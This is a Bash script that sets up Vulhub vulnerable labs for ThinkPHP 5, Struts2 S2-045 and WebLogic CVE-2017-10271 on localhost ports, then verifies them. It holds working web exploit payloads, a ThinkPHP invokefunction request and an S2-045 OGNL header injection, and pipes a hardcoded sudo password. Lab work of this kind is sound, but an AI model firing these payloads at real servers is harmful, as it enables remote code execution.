#!/bin/bash
# 手动单独启：① ThinkPHP（镜像已拉好）→ 改 8081 + up
# 然后后台拉：② Struts2 8082  ③ WebLogic 8083（timeout 60min）
export KALI_PASS="kail"
echo "$KALI_PASS" | sudo -S -v -p "" 2>/dev/null
SUDO="sudo"
SEP="============================================================"

echo "$SEP"
echo " ① ThinkPHP 5 RCE 启动（改端口 8081）"
echo "$SEP"
cd ~/vulhub/thinkphp/5-rce 2>/dev/null || { echo "目录不存在，先clone"; cd ~; git clone --depth 1 https://github.com/vulhub/vulhub.git vulhub_clone_tmp 2>&1 | tail -3; [ -d ~/vulhub_clone_tmp/thinkphp ] && { [ ! -d ~/vulhub ] && mv ~/vulhub_clone_tmp ~/vulhub; } || true; }
cd ~/vulhub/thinkphp/5-rce
cat docker-compose.yml
echo ""
echo " 改端口：默认 8080 → 8081"
$SUDO sed -i -E 's/["]?8080["]?:80$/"8081:80"/g; s/[-][[:space:]]*8080:80$/- "8081:80"/g' docker-compose.yml
cat docker-compose.yml
echo ""
$SUDO docker-compose down 2>/dev/null
echo " 启动 thinkphp 5-rce ..."
$SUDO docker-compose up -d 2>&1 | tail -8
sleep 25
for i in 1 2 3 4 5 6 7; do
  C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1:8081/ 2>&1 || echo 000)
  RCE_CHECK=$(curl -sS --max-time 15 "http://127.0.0.1:8081/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1" 2>/dev/null | head -c 300)
  echo "  [ThinkPHP] 试 $i: / HTTP $C  /  phpinfo payload 返回 ${#RCE_CHECK} bytes"
  if [ ${#RCE_CHECK} -gt 50 ] && [ "$C" != "000" ]; then
    echo "    ✅ ThinkPHP 5 RCE 漏洞复现成功！(POC 返回 phpinfo HTML)"
    break
  fi
  sleep 10
done
echo ""
$SUDO docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}" | grep -E "think|NAMES"

echo ""
echo "$SEP"
echo " ② 拉 Struts2 S2-045（Tomcat，预计 550MB，3-15 分钟）+ 端口 8082"
echo "$SEP"
cd ~/vulhub/struts2/s2-045 && {
  $SUDO sed -i -E 's/["]?8080["]?:8080$/"8082:8080"/g; s/[-][[:space:]]*8080:8080$/- "8082:8080"/g' docker-compose.yml
  cat docker-compose.yml
  echo "[-] pull"
  timeout 900 $SUDO docker-compose pull 2>&1 | tail -15
  echo "[-] up -d"
  $SUDO docker-compose down 2>/dev/null
  timeout 180 $SUDO docker-compose up -d 2>&1 | tail -10
  sleep 60
  for i in $(seq 1 10); do
    C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 12 http://127.0.0.1:8082/ 2>&1 || echo 000)
    HEADER_CHECK=$(curl -sS -D - -X POST --max-time 15 http://127.0.0.1:8082/ \
      -H 'Content-Type: %{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Test-S2045","PWN_OK")}.multipart/form-data' 2>&1 | grep -i "X-Test-S2045" || echo "__NOPE__")
    echo "  [S2-045] 试 $i: / HTTP $C  /  HeaderInject = $HEADER_CHECK"
    if [ "$HEADER_CHECK" != "__NOPE__" ]; then echo "    ✅ S2-045 OGNL RCE 验证成功！" ; break; fi
    sleep 20
  done
  $SUDO docker ps --format "{{.Names}}\t{{.Image}}\t{{.Ports}}" | grep -i s2
} || echo "目录不存在：~/vulhub/struts2/s2-045"

echo ""
echo "$SEP"
echo " ③ 拉 WebLogic CVE-2017-10271（1.2GB，20-40 分钟耐心等）+ 端口 8083"
echo "$SEP"
cd ~/vulhub/weblogic/CVE-2017-10271 && {
  $SUDO sed -i -E 's/["]?7001["]?:7001$/"8083:7001"/g; s/[-][[:space:]]*7001:7001$/- "8083:7001"/g' docker-compose.yml
  cat docker-compose.yml
  echo "[-] pull (最大，耐心等)"
  timeout 2400 $SUDO docker-compose pull 2>&1 | tail -20
  echo "[-] up -d"
  $SUDO docker-compose down 2>/dev/null
  timeout 300 $SUDO docker-compose up -d 2>&1 | tail -10
  sleep 90
  for i in $(seq 1 18); do
    C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 "http://127.0.0.1:8083/ws-wsat/CoordinatorPortType" 2>&1 || echo 000)
    BODY_SZ=$(curl -s --max-time 15 "http://127.0.0.1:8083/ws-wsat/CoordinatorPortType" 2>/dev/null | wc -c)
    echo "  [WebLogic WSAT] 试 $i: HTTP $C  Body=$BODY_SZ bytes (WebLogic 启动超慢，等 3 分钟以上正常)"
    if [ $BODY_SZ -gt 200 ]; then echo "    ✅ WebLogic WSAT 端点已加载，靶场 OK！" ; break; fi
    sleep 20
  done
  $SUDO docker ps --format "{{.Names}}\t{{.Image}}\t{{.Ports}}" | grep -i weblogic
} || echo "目录不存在：~/vulhub/weblogic/CVE-2017-10271"

echo ""
echo "$SEP"
echo " 最终汇总：4 端口 + 3 靶场 + 1 Demo"
echo "$SEP"
$SUDO docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}" 2>&1
echo ""
for p in 8080 8081 8082 8083; do
  case $p in
    8080) name="Tomcat CVE-2017-12615 (Demo)" ; url="http://127.0.0.1:$p/" ;;
    8081) name="ThinkPHP 5 RCE   "            ; url="http://127.0.0.1:$p/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" ;;
    8082) name="Struts2 S2-045    "           ; url="http://127.0.0.1:$p/" ;;
    8083) name="WebLogic CVE 2017 "           ; url="http://127.0.0.1:$p/ws-wsat/CoordinatorPortType" ;;
  esac
  C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$url" 2>&1 || echo 000)
  SZ=$(curl -s --max-time 10 "$url" 2>/dev/null | wc -c)
  TAG=$([ $SZ -gt 50 ] && [ "$C" != "000" ] && [ "$C" != "502" ] && echo "✅OK" || echo "⏳  ")
  echo "  $TAG   :$p  $name  HTTP=$C  Size=${SZ}B"
done
echo ""
echo "✅ 访问指南（宿主机）:"
echo "   Tomcat 示例     → http://192.168.108.128:8080/"
echo "   ThinkPHP 5 RCE  → http://192.168.108.128:8081/"
echo "   Struts2 S2-045  → http://192.168.108.128:8082/"
echo "   WebLogic WSAT   → http://192.168.108.128:8083/console"
echo "DONE."
